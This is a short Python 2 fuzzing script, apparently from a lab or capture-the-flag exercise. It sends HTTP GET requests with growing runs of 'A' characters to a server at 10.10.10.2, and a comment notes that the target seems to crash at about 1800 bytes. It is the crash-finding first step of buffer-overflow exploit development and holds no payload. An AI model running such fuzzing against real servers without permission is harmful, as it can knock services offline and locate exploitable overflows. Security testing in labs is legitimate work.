#!/usr/bin/env python2

import requests
import time

# appears to break at 1800

count = 100

while (count < 5000):
    buf = "A" * count
    url = "http://10.10.10.2/" + buf
    print "[*] Buffer size " + str(count)
    r = requests.get(url)
    time.sleep(2)
    count += 100

print r.text
